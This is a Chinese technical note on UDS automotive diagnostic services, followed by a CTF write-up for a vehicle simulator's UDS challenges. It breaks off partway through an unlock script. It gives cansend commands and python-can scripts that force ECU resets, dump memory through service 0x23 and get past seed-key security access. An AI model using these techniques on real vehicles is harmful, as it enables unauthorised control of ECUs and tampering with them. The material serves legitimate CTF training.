+<p>各字段含义：</p>
+<ol>
+<li><code>23</code><ul>
+<li>服务ID，表示<code>Read Memory By Address</code>服务。</li>
+</ul>
+</li>
+<li><code>14</code><ul>
+<li>子功能，表示物理内存读取。</li>
+</ul>
+</li>
+<li><code>内存地址</code><ul>
+<li>动态长度，指定要读取的内存区域的起始地址。</li>
+</ul>
+</li>
+<li><code>读取长度</code><ul>
+<li>动态长度，表示要读取的字节数。</li>
+</ul>
+</li>
+</ol>
+<h3 id="section-22">27服务（安全访问）</h3><p>用于防止未经授权的访问 ECU 中的敏感数据或功能（如编程、写入 DTC、标定等）。</p>
+<p>见Security Access Level </p>
+<p>UDS协议规定：进入扩展诊断会话后再提供27服务，而不可以直接提供27服务</p>
+<ul>
+<li>**27服务（安全访问）**必须在某些特定的诊断会话中才可用，例如：<ul>
+<li><strong>扩展诊断会话</strong>（<code>0x10 0x03</code>）</li>
+<li><strong>编程会话</strong>（<code>0x10 0x02</code>）</li>
+</ul>
+</li>
+<li>默认会话（Default Session，<code>0x10 0x01</code>）通常不允许使用27服务，因为此会话主要用于基础诊断功能，不提供高级功能权限。</li>
+</ul>
+<p>这是一种访问控制机制，确保只有在适当的上下文下，敏感的操作（如安全访问或刷写ECU固件）才能被允许。</p>
+<p>工作机制 —— &quot;请求种子，返回钥匙&quot; 流程（Challenge–Response）</p>
+<ol>
+<li><strong>请求种子（Request Seed）</strong><br> Tester 向 ECU 发送 <code>0x27 0x01</code>（或其他子功能） 请求种子<br>  ECU 响应：<code>0x67 0x01 [Seed]</code></li>
+<li><strong>发送钥匙（Send Key）</strong><br> Tester 使用种子计算出钥匙，通过 <code>0x27 0x02 [Key]</code> 发给 ECU<br>  ECU 响应成功：<code>0x67 0x02</code><br>  ECU 响应失败：<code>0x7F 0x27 0x35</code>（密钥不匹配）</li>
+</ol>
+<blockquote>
+<p>一般有多级安全（如 0x01/0x02 是一级，0x03/0x04 是二级）</p>
+</blockquote>
+<p> 子功能列表（常见标准定义）</p>
+<table>
+<thead>
+<tr>
+<th>子功能码</th>
+<th>含义</th>
+<th>方向</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>0x01</code></td>
+<td>请求种子（Level 1）</td>
+<td>Tester → ECU</td>
+</tr>
+<tr>
+<td><code>0x02</code></td>
+<td>发送密钥（Level 1）</td>
+<td>Tester → ECU</td>
+</tr>
+<tr>
+<td><code>0x03</code></td>
+<td>请求种子（Level 2）</td>
+<td>Tester → ECU</td>
+</tr>
+<tr>
+<td><code>0x04</code></td>
+<td>发送密钥（Level 2）</td>
+<td>Tester → ECU</td>
+</tr>
+<tr>
+<td><code>0x05</code></td>
+<td>请求种子（Level 3）</td>
+<td>Tester → ECU</td>
+</tr>
+<tr>
+<td><code>0x06</code></td>
+<td>发送密钥（Level 3）</td>
+<td>Tester → ECU</td>
+</tr>
+<tr>
+<td><code>...</code></td>
+<td>...</td>
+<td>...</td>
+</tr>
+<tr>
+<td><code>0x81</code></td>
+<td>请求种子（OEM扩展）</td>
+<td>Tester → ECU</td>
+</tr>
+<tr>
+<td><code>0x82</code></td>
+<td>发送密钥（OEM扩展）</td>
+<td>Tester → ECU</td>
+</tr>
+</tbody></table>
+<hr>
+<p>📌 特点说明</p>
+<ul>
+<li>子功能码始终是 <strong>奇数表示请求种子</strong>，<strong>偶数表示发送密钥</strong></li>
+<li>安全级别由 OEM 自定义，不同级别授权不同功能</li>
+<li>通常 Level 1 只读访问，Level 2 允许写入/编程</li>
+</ul>
+<h3 id="section-23">2E（写入数据）</h3><p><strong>核心功能</strong>：2E服务是通过DID（Data Identifier，数据标识符）向ECU（电子控制单元）写入数据的诊断服务。</p>
+<p><strong>应用场景</strong></p>
+<ul>
+<li><strong>车辆生产与配置</strong>：<ul>
+<li>整车下线时写入配置信息（如VIN码），证据中明确提到写入VIN码的DID为<code>F190</code>。</li>
+<li>重置Flash数据或清除NVM（非易失性存储器）数据。</li>
+</ul>
+</li>
+<li><strong>ECU维护与调试</strong>：<ul>
+<li>修改ECU标定参数（如传感器校准值）。</li>
+<li>ECU内部测试（如写入测试参数并读取反馈）。</li>
+</ul>
+</li>
+<li><strong>固件更新与诊断</strong>：<ul>
+<li>在FOTA（空中固件升级）流程中，用于写入指纹、版本号等预配置信息。</li>
+<li>配合其他服务（如27服务解锁安全权限）实现数据写入。</li>
+</ul>
+</li>
+</ul>
+<p><strong>依赖条件与限制</strong></p>
+<ul>
+<li><strong>会话模式</strong>：必须在<strong>非默认会话</strong>（如扩展会话）下执行，默认会话模式不支持2E服务。</li>
+<li><strong>安全权限</strong>：需先通过27服务（Security Access）完成安全解锁。</li>
+<li><strong>数据有效性</strong>：DID需在ECU中预定义且支持写入操作，否则返回NRC。</li>
+<li><strong>车速限制</strong>：部分ECU要求在车速为0时才能执行写入操作（避免行驶中误修改关键参数）</li>
+</ul>
+<h3 id="section-24">2F</h3><h4>功能</h4><ul>
+<li><strong>核心作用</strong>：允许诊断仪（客户端）主动请求ECU（服务器）对特定输入/输出信号进行控制，屏蔽实际信号值，转而由客户端设置指定值。</li>
+<li><strong>控制对象</strong>：<ul>
+<li><strong>输入信号</strong>（如传感器数据）、<strong>内部参数</strong>（如ADAS功能配置）、<strong>输出信号</strong>（如执行器、车灯）。</li>
+<li>通过 <strong>Data Identifier (DID)</strong>  标识被控制的对象（如 <code>0x9B00</code> 表示进气口门位置）。</li>
+</ul>
+</li>
+</ul>
+<h4>应用场景</h4><p>2F服务适用于<strong>简单、静态的控制场景</strong>，典型案例如下：</p>
+<ul>
+<li><strong>车身控制</strong>：车窗升降、后视镜折叠、车灯开关。</li>
+<li><strong>执行器控制</strong>：直连执行器的启动/停止（如雨刮器、电机）。</li>
+<li><strong>ADAS功能</strong>：配置开启/关闭特定驾驶辅助功能。</li>
+<li><strong>生产线测试</strong>：高效验证车辆功能（如批量测试车窗升降）。</li>
+<li><strong>LED报警灯</strong>：驱动或关闭报警指示灯。</li>
+</ul>
+<blockquote>
+<p>⚠️ <strong>注意</strong>：复杂控制（如内存擦除、自检流程）需使用 <strong>31服务</strong>（RoutineControl）。</p>
+</blockquote>
+<hr>
+<h4>请求报文格式</h4><p>请求报文由四部分组成：</p>
+<ol>
+<li><strong>SID</strong>：固定为 <code>0x2F</code>。</li>
+<li><strong>Data Identifier (DID)</strong> ：2字节，标识被控对象（如 <code>0x9B00</code>）。</li>
+<li><strong>ControlOptionRecord</strong>：<ul>
+<li><strong>InputOutputControlParameter (IOCP)</strong> ：1字节，定义控制类型：<ul>
+<li><code>0x00</code>：归还控制权给ECU（结束控制）。</li>
+<li><code>0x01</code>：重置为默认值。</li>
+<li><code>0x02</code>：冻结当前状态。</li>
+<li><code>0x03</code>：设置为指定值（需提供自定义参数）。</li>
+</ul>
+</li>
+<li><strong>ControlState (CS)</strong> ：若干字节，由厂商自定义参数（如持续时间、目标值）。</li>
+</ul>
+</li>
+<li><strong>ControlEnableMaskRecord</strong>（可选）：<ul>
+<li>当控制多个参数时，用于选择启用的参数。</li>
+<li>单参数控制时不可使用，否则触发否定响应 <code>NRC 0x13</code>（格式错误）。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h4>与31服务的区别</h4><table>
+<thead>
+<tr>
+<th><strong>特性</strong></th>
+<th><strong>2F服务</strong></th>
+<th><strong>31服务</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>适用场景</strong></td>
+<td>简单静态控制（开关、设值）</td>
+<td>复杂控制（自检、校准、内存操作）</td>
+</tr>
+<tr>
+<td><strong>控制类型</strong></td>
+<td>闭环控制（可实时观察反馈）</td>
+<td>开环控制（无实时反馈）</td>
+</tr>
+<tr>
+<td><strong>灵活性</strong></td>
+<td>较低（依赖预定义DID）</td>
+<td>更高（支持自定义例程）</td>
+</tr>
+<tr>
+<td><strong>替代性</strong></td>
+<td>31服务可覆盖2F功能，但属过度设计</td>
+<td>不可替代复杂操作</td>
+</tr>
+</tbody></table>
+<hr>
+<h4>使用条件与限制</h4><ul>
+<li><strong>前提条件</strong>：<ul>
+<li>ECU需处于<strong>非默认会话</strong>（如扩展会话）。</li>
+<li>通过<strong>安全访问</strong>解锁（27服务）。</li>
+<li>无严重故障码或安全隐患。</li>
+</ul>
+</li>
+<li><strong>控制时效</strong>：<ul>
+<li>复位ECU、切换会话或车速超限时，控制自动终止。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="section-25"><strong>总结</strong></h3><p>2F服务是UDS中用于<strong>简单、快速控制ECU I/O信号</strong>的核心服务，适用于生产线测试、车身功能验证等场景。其优势在于协议简洁、响应直接，但需注意与31服务的分工：<strong>简单操作用2F，复杂逻辑用31</strong>。开发者需严格遵循报文格式（如ControlEnableMask的禁用场景），并确保满足安全访问等前置条件。</p>
+<h3 id="section-26">31(常规控制)</h3><p><strong>Routine Control</strong> 是 UDS（Unified Diagnostic Services，ISO 14229）协议中的一项服务，其主要功能是控制车辆电子控制单元（ECU）执行某些特定的例行任务。这些任务通常用于诊断、测试或校准特定功能，比如运行某个特定的健康检查、初始化某些模块、或者触发特定的车辆行为。</p>
+<h4>Routine Control 的服务 ID 和子功能</h4><ul>
+<li><strong>服务 ID (SID):</strong> <code>0x31</code></li>
+<li><strong>功能:</strong> 通过此服务，诊断工具可以请求 ECU 执行预定义的例行程序。</li>
+</ul>
+<h4>子功能 (Subfunctions)</h4><ul>
+<li><strong>0x01: StartRoutine</strong><br>启动一个例行程序。</li>
+<li><strong>0x02: StopRoutine</strong><br>停止正在运行的例行程序。</li>
+<li><strong>0x03: RequestRoutineResults</strong><br>请求获取例行程序的执行结果。</li>
+</ul>
+<h1>车联网ctf uds挑战</h1><h2 id="section-27">虚拟环境</h2><p>vesa的uds终端不允许直接pip下载工具，因此后面需要写脚本的题目基本都无法import can库等工具，我们可以使用虚拟环境来解决这个脚本问题。</p>
+<pre><code class="language-plain">创建一个新的虚拟环境，并在其中安装模块运行：
+python3 -m venv myenv
+激活
+source myenv/bin/activate
+pip install python-can
+python3 ex.py
+</code></pre>
+<h2 id="section-28">特殊仲裁ID</h2><h3 id="section-29">0x7DF</h3><p>在汽车 OBD-II（On-Board Diagnostics）协议中，<code>0x7DF</code> 是一个功能寻址（Functional Addressing）的 ID，表示请求发送给总线上的所有 ECUs（Electronic Control Units，电子控制单元）。</p>
+<p>这是一个广播请求，所有设备都会监听该 ID。</p>
+<h2 id="section-30"><strong>Can you find the interface?</strong></h2><pre><code class="language-plain">题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E UDS Challenge Simulation, then launch the terminal.What is the name of the CAN interface available on the virtual terminal?翻译：此挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E UDS 挑战模拟，然后启动终端。虚拟终端上可用的 CAN 接口名称是什么？
+</code></pre>
+<p>想要看 CAN 接口名称可以在终端输入 ifconfig 或者 ip link，得到 flag：vcan0</p>
+<h2 id="section-31"><strong>Arbitration</strong></h2><pre><code class="language-plain">题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E UDS Challenge Simulation, then launch the terminal.What is the Arbitration ID of the CAN frame being sent periodically on the CAN interface?翻译：本次挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E UDS 挑战模拟，然后启动终端。在 CAN 接口上定期发送的 CAN 帧的仲裁 ID 是什么？
+</code></pre>
+<p>想要看 CAN 总线上发的什么可以使用 candump 指定特定的 CAN 接口，监听 CAN 总线上的数据，可以看到定期发送的 CAN 数据，ID 为 59E，因此 flag 为 59E</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/16272cdd3d0c89234b4754f05658c2e6_MD5.png" alt=""></p>
+<p><code>candump</code> 是 Linux 系统中用于监控和记录 CAN（Controller Area Network）总线上数据的命令，通常与 CAN 通信相关的硬件一起使用，比如车载总线或工业控制网络。这个工具是 <strong>can-utils</strong> 软件包的一部分，可以捕获并显示 CAN 数据帧，帮助调试和分析 CAN 网络通信。</p>
+<p><code>candump</code> 命令捕获并显示了虚拟CAN接口 <code>vcan0</code> 上传输的CAN消息。具体解析如下：</p>
+<ul>
+<li><strong>接口名称</strong> (<code>vcan0</code>): 表示捕获到的CAN消息是在 <code>vcan0</code> 这个虚拟CAN接口上传输的。</li>
+<li><strong>CAN ID</strong> (<code>59E</code>): 表示消息的标识符，用于识别消息的类型或来源。在此图中，所有消息的CAN ID都为 <code>59E</code>。</li>
+<li><strong>数据长度代码</strong> (<code>[2]</code>): 也称为 DLC (Data Length Code)，表示该消息包含的数据字节数。此处 <code>[2]</code> 表示消息包含2字节的数据。</li>
+<li><strong>数据内容</strong> (<code>9E 10</code>): 消息的实际数据内容，每个字节以十六进制显示。在该示例中，数据为 <code>9E 10</code>。</li>
+</ul>
+<p>总结来说，这些 <code>candump</code> 的输出展示了多条在 <code>vcan0</code> 接口上传输的相同CAN消息，CAN ID 为 <code>59E</code>，数据长度为2字节，数据内容为 <code>9E 10</code>。这些信息通常用于调试或分析CAN总线的传输数据。</p>
+<h2 id="section-32"><strong>Data Field 1</strong></h2><pre><code class="language-plain">题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E UDS Challenge Simulation, then launch the terminal.How many bytes of data are in the data field of the CAN frame being sent periodically on the CAN interface?翻译：此挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E UDS 挑战模拟，然后启动终端。在 CAN 接口上定期发送的 CAN 帧的数据字段中有多少字节数据？
+</code></pre>
+<p>问你定期发送 CAN 帧的 DLC（Data Length Code）是多少，也就是 数据的长度，同样使用 candump vcan0 可以得到答案为 2</p>
+<h2 id="section-33"><strong>Data Field 2</strong></h2><pre><code class="language-plain">题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E UDS Challenge Simulation, then launch the terminal.What is the value of the data field of the CAN frame being sent periodically on the CAN interface? Format: XXYY翻译：此挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E UDS 挑战模拟，然后启动终端。在 CAN 接口上定期发送的 CAN 帧的数据字段的值是多少？格式：XXYY
+</code></pre>
+<p>数据就是 9E10</p>
+<h2 id="section-34"><strong>Message Frequency</strong></h2><pre><code class="language-plain">题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E UDS Challenge Simulation, then launch the terminal.What is the frequency that the periodic CAN frame is transmit at? (in Hz)翻译：此挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E UDS 挑战模拟，然后启动终端。周期性 CAN 帧的传输频率是多少？（单位为 Hz）
+</code></pre>
+<p>使用 candump -l vcan0 可以将 CAN 总线数据捕获为一个 log 文件，cat 该 log 文件会有每条 CAN 数据记录的时间，题目问周期性 CAN 帧的传输频率，感觉不可能算的多精确，看上去基本就是一秒一个，所以试了一下答案就是 1..</p>
+<p>左到右，时间戳，</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/ca6356dd16a75ce59630a2c20b3584ac_MD5.png" alt=""></p>
+<h2 id="section-35"><strong>Simulation VIN</strong></h2><pre><code class="language-plain">题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E UDS Challenge Simulation, then launch the terminal.Retrieve the VIN of the simulation using UDS.翻译：此挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E UDS 挑战模拟，然后启动终端。使用 UDS 检索模拟的 VIN。
+</code></pre>
+<p>读取VIN码使用22服务(通过标识符读取数据), <code>0xF190</code> 代表 VIN 码请求，22为SID(服务号),f190为DID(数据标识符)</p>
+<p>VIN码较长,需要多帧发送接收,所以需要使用流控帧(FC)和连续帧(CF)</p>
+<p>payload</p>
+<pre><code class="language-plain">cansend vcan0 7df#0322f190 &amp;&amp; cansend vcan0 7e0#3000000000000000
+</code></pre>
+<p>报文</p>
+<p>在 UDS over CAN 中，请求 ID 和响应 ID 是成对出现的。请求 ID 通常是 <code>0x7E0</code>（表示诊断仪发送给 ECU），对应的响应 ID 是 <code>0x7E8</code>（ECU 回复诊断仪），这个 <code>+0x08</code> 的关系符合 ISO 15765 协议规范。</p>
+<pre><code class="language-python">  vcan0  7DF   [4]  03 22 F1 90 #7DF：OBD-II 的广播地址，表示请求会发送给所有的 ECU
+  vcan0  7E8   [8]  10 14 62 F1 90 66 6C 61#0x1是首帧标志，0x014是大小,0x62是肯定响应sid+0x40，f190子功能id。7E8：响应的 ECU 地址，表示 ECU 的 ID
+  vcan0  7E0   [8]  30 00 00 00 00 00 00 00#0x30流控帧标识，发送后显示剩余连续帧。id:7e0因为要回复7e8，所以流控帧就发送到0x7e0。7E0：流控帧的发送 ECU 地址。
+  vcan0  7E8   [8]  21 67 7B 76 31 6E 5F 42 #连续帧1，0x21。7E8：响应的 ECU 地址。
+  vcan0  7E8   [8]  22 48 6D 61 63 68 33 7D #连续帧2，7E8：响应的 ECU 地址。
+</code></pre>
+<p>VIN 码后转为 ASCII 得到 flag：flag{v1n_BHmach3}</p>
+<h2 id="section-36"><strong>Startup Message</strong></h2><pre><code class="language-plain">题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E UDS Challenge Simulation, then launch the terminal.It seems the simulation broadcasts some diagnostic information on arbitration ID 0x7DF when booting up, what does this message say? (in ASCII)HINT: How can you get an ECU to restart?
+翻译：此挑战在 VSEC 上的 Harborbay 车辆模拟器中进行。从主页进入 HarborBay。选择 Mach-E UDS 挑战模拟，然后启动终端。似乎模拟在启动时广播了一些有关仲裁 ID 0x7DF 的诊断信息，这条消息说了什么？（ASCII 格式）提示：如何让 ECU 重新启动？
+</code></pre>
+<pre><code class="language-python">cansend vcan0 7df#021101    #用11服务的重启子服务
+</code></pre>
+<pre><code class="language-python"> vcan0  7DF   [3]  02 11 01 #01硬复位
+ vcan0  7E8   [8]  02 51 01 00 00 00 00 00 #响应帧，确认硬复位
+ vcan0  59E   [2]  9E 10 
+ vcan0  7DF   [8]  07 67 30 47 72 65 33 6E
+</code></pre>
+<p>答案 67 30 47 72 65 33 6E---&gt;g0Gre3n</p>
+<h2 id="section-37"><strong>Engine Trouble?</strong></h2><pre><code class="language-plain">题目描述：This challenge is within the Harborbay vehicle simulator on VSEC. From the home page, enter HarborBay. Select the Mach-E UDS Challenge Simulation, then launch the terminal.The simulation&#39;s engine light is on, can you read the diagnostic code?Check out our youtube walkthrough if you get stuck: https://www.youtube.com/watch?v=IaUL0dA4Z_YThe format of the DTC is Pxxxx-xx. Example answer: P1234-01翻译：此挑战在 VSEC 上的 Harborbay 车辆模拟器内进行。从主页进入 HarborBay。选择 Mach-E UDS 挑战模拟，然后启动终端。模拟的发动机灯亮了，你能读出诊断代码吗？如果你遇到困难，请查看我们的 YouTube 演示：https://www.youtube.com/watch?v=IaUL0dA4Z_YDTC 的格式为 Pxxxx-xx。示例答案：P1234-01
+</code></pre>
+<p>这次来使用状态掩码读取 DTC，也就是 02 子服务，但掩码是啥呢，定义如下，我们来读 confirmedDTC，也就是 bit3 为 1，其余为 0，0000 1000 =&gt; 08</p>
+<p>DTC 状态掩码（过滤条件，0x08 表示查询“当前确认的故障”）</p>
+<pre><code class="language-plain">cansend vcan0 7DF#03190208
+收到：7E8#075902083E9F01AB
+</code></pre>
+<p>对收到的数据 3E9F01AB 进行解析，前两位有一个对应关系</p>
+<table>
+<thead>
+<tr>
+<th>00</th>
+<th>P  动力总成</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>01</td>
+<td>C  底盘</td>
+</tr>
+<tr>
+<td>10</td>
+<td>B  车身</td>
+</tr>
+<tr>
+<td>11</td>
+<td>U  网络</td>
+</tr>
+</tbody></table>
+<p><a href="https://www.cnblogs.com/cokefentas/p/17514220.html">DTC标准故障码格式解析 - 可乐芬达 - 博客园</a></p>
+<p>答案：P3E9F-01</p>
+<h2 id="section-38"><strong>Secrets in Memory?</strong></h2><pre><code class="language-plain">It seems the simulation allows access to only some off-chip sections of memory, are there any secrets in the visible memory?
+看来模拟只允许访问一些片外内存部分，可见内存中有什么秘密吗？
+
+The memory region starts at 0xC3F80000 and the flag is in the format flag{...}.
+内存区域从 0xC3F80000 开始，标志的格式为 flag{...}。
+</code></pre>
+<p>23服务读内存</p>
+<p>e.py</p>
+<pre><code class="language-python">import can
+import time
+import binascii
+
+# 初始化 CAN 总线
+# 使用 socketcan 接口和 vcan0 云中 CAN 模拟通道
+bus = can.Bus(interface=&#39;socketcan&#39;, channel=&#39;vcan0&#39;)
+# 可选缓满过滤器，限制接收特定 ID 的 CAN 消息
+# bus.set_filters([{&quot;can_id&quot;: 0x7E8, &quot;can_mask&quot;: 0xFFF, &quot;extended&quot;: False}])
+
+# 用于累积接收的数据
+recvdata = &quot;[DATA]:&quot;
+
+# 进行地址进一步测试，地址范围：0xC3F83000 - 0xC3F865FF,步长为0xff
+for hex_value in range(0xC3F83000, 0xC3F865ff, 0xFF):
+    # 将地址分解为 4 个字节
+    byte1 = (hex_value &gt;&gt; 24) &amp; 0xFF  # 高位字节
+    byte2 = (hex_value &gt;&gt; 16) &amp; 0xFF
+    byte3 = (hex_value &gt;&gt; 8) &amp; 0xFF
+    byte4 = hex_value &amp; 0xFF  # 位字节
+
+    # 构造发送数据消息，其中：
+    # 0x07: 指定消息长度，0x23 和 0x14 为协议服务标识符
+    # byte1-byte4: 代表地址转换字节
+    # 0xFF: 补充位
+    candata = [0x07, 0x23, 0x14, byte1, byte2, byte3, byte4, 0xFF]
+    #查看此地址后0xff内内存中的值
+    
+    # 构造一条 CAN 消息：
+    # arbitration_id=0x7DF 表示功能定向请求，送致所有 ECU
+    # is_extended_id=False 表示标准格式使用 11 位 ID
+    # dlc=8 表示数据部分长度为 8 字节
+    message = can.Message(arbitration_id=0x7DF, is_extended_id=False, dlc=8, data=candata)
+    
+    # 发送消息
+    bus.send(message, timeout=0.2)
+    
+    # 接收 CAN 消息
+    msg = bus.recv()
+    print(&quot;orgin:\n&quot;, msg)  # 展示原始消息
+    
+    # 如果接收到消息，将其数据转换为十六进制字符串，并累积到 recvdata
+    if msg is not None:
+        recvdata += binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)[6:]#回复帧6位也就是3字节后才是有效数据
+
+    # 发送流控制框（Flow Control Frame），指示 ECU 可以继续发送数据
+    message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
+    bus.send(message, timeout=0.2)
+
+    # 继续接收 ECU 的响应，最多 36 条消息，36*7+4=256=0xff
+    temp = 0
+    while temp &lt; 36:
+        msg = bus.recv()
+        if msg is not None:
+            # 将消息数据转换为十六进制，并删除前 1个字节，只看后面的数据
+            tempdata = binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)[2:]
+            if tempdata != &quot;00000000000000&quot;:
+                recvdata += tempdata  # 累积有效数据
+        temp += 1
+
+# 显示最终接收到的全部数据
+print(&quot;\n========== READMEM ==========&quot;)
+print(recvdata)
+print(&quot;========== READMEM ==========&quot;)
+
+# 关闭 CAN 总线，释放资源
+bus.shutdown()
+</code></pre>
+<pre><code class="language-plain">========== READMEM ==========
+[DATA]:4e494c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004e494c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004e494c3f00000000000000000000000000000000000000000000000000000000666c61677b6d656d2b723334647d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000424c30434b483452423052ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff68747470733a2f2f6769746875622e636f6d2f69436f6c6c696e0000
+========== READMEM ==========
+</code></pre>
+<p>f666c61677b6d656d2b723334647d--&gt;&gt;flag{mem+r34d}</p>
+<h2 id="section-39"><strong>Security Access Level 3</strong></h2><pre><code class="language-plain">The simulation is implementing service 0x27 Security Access Level 3 using MAAATH. Can you find the key and break in?
+模拟正在使用 MAAATH 实现服务 0x27 安全访问级别 3。您能找到密钥并闯入吗？
+
+The flag is the key to unlock with seed 1337 in hex (example a5a5)
+标志是使用十六进制种子 1337 解锁的密钥（例如 a5a5）
+</code></pre>
+<p>不用进terminal操作，将0x1337按位取反即可，得到 <code>0xecc8</code></p>
+<h2 id="section-40"><strong>Security Access Level 1</strong></h2><pre><code class="language-plain">Level 3 provides access to a new diagnostic session and some new memory at 0x1A000, but we still don&#39;t have full control of the module. Can you provide a valid key for security access level 1?
+级别 3 允许访问新的诊断会话和位于 0x1A000 的一些新内存，但我们仍然无法完全控制该模块。您能否提供安全访问级别 1 的有效密钥？
+
+The flag is the key to unlock with seed 7D0E1A5C in hex (example 12345678)
+该标志是使用十六进制种子 7D0E1A5C（例如 12345678）解锁的密钥
+
+cansend vcan0 7e0#0210030000000000 通过0x10服务，进入0x03诊断会话
+cansend vcan0 7e0#0227030000000000 对安全等级为3进行0x27安全访问
+cansend vcan0 7e0#0427047088000000 通过返回的种子算出key值，发送进行解锁
+cansend vcan0 7e0#0227010000000000 对安全等级为1进行0x27安全访问
+通过0x10服务，进入0x03诊断会话，然后使用0x27服务对安全等级1进行安全访问，最后通过返回的种子算出key值，发送进行解锁
+</code></pre>
+<p>unlock.py</p>
+<pre><code class="language-python">import can
+import time
+import binascii
+
+# 初始化CAN总线
+bus = can.Bus(interface=&#39;socketcan&#39;, channel=&#39;vcan0&#39;)
+
+# 进入扩展诊断会话
+print(&quot;Entering diagnostic session...&quot;)
+message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x02, 0x10, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00])
+bus.send(message, timeout=0.2)
+msg = bus.recv()
+print(f&quot;Diagnostic session response: {binascii.hexlify(msg.data).decode(&#39;utf-8&#39;)}&quot;)
+
+# 安全访问安全等级为3的会话
+print(&quot;Accessing security level 3...&quot;)
+message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, data=[0x02, 0x27, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00])
+bus.send(message, timeout=0.2)
+msg = bus.recv()
